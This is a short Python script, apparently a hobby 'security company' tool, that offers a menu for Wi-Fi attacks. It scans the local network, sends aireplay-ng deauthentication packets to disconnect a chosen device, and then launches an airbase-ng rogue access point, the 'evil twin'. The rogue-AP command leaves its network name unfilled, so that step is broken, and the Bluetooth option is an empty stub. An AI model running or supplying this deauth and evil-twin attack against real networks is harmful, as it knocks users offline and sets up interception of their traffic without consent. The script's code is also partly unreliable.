# Excalibure Security Company's "Holy Grail"


import os
import time
import scapy
import subprocess

options = ['Deauth evil twin test','Bluetooth','Settings', 'Clear']
Soptions = ['Connect to network','Logs','Back', 'Clear']
net_inf = 'wlan0'
APSSID = subprocess.check_output('iwgetid -r',shell=True).decode().strip()
APMac = subprocess.check_output("iwgetid -a -r",shell=True).decode().strip()	


#Recieves the input command to be executed
def Home():
	print("\nWhat would you like to do?\n")
	print("Options:")
	for i in options: print(i)

	# Prompt for input until there is a valid command
	Correct = False
	while (Correct == False):
		com = input("\n: ")
		if com in options:
			Correct = True;
		else: 
			print("Please enter a valid command")
		print('\n')

	# Call function based on input
	if com == 'Deauth evil twin test': DETT()
	elif com == 'Bluetooth': BAT()
	elif com == 'Settings': settings()
	elif com == 'Clear': 
		os.system('clear') 
		Home()


# Preforms Deauth Evil Twin Test
def DETT():
	# Deauth the selected user
	os.system('sudo arp-scan -I wlan0 --localnet')      #scans for local IP and Mac adresses
	print("\nPlease sellect a device by MAC address")
	atk = input('\n: ')
	os.system('sudo aireplay-ng --deauth 9 -a {} -c {} wlan0'.format(APMac,atk))      #Sends Deauth packets to target until lost connection
	time.sleep(1)
	cont = input('\nDeauth Another Device?(Y/N)\n: ')
	if cont == 'Y' or cont == 'y':
		DETT()

	# Set up the evil Twin
	os.system('sudo airbase-ng -e {} -c 6 wlan0')
	Home()


# 
def BAT(): 
	print('Test2')
	Home()


# Goes to the settings menue
def settings():
	print("Options: ")
	for i in Soptions: print(i)

	# Prompt for input until there is a valid command
	Correct = False
	while (Correct == False):
		com = input("\n: ")
		if com in Soptions:
			Correct = True;
		else: 
			print("Please enter a valid command")
		print('\n')
	if com == 'Back': Home()
	elif com == 'Clear': 
		os.system('clear') 
		settings()


	### Main ###
# Home Menue Startup
print("Welcome to the Holy Grail!");
time.sleep(3)
os.system('clear')
#print(APMac)
#print(APSSID)
Home()

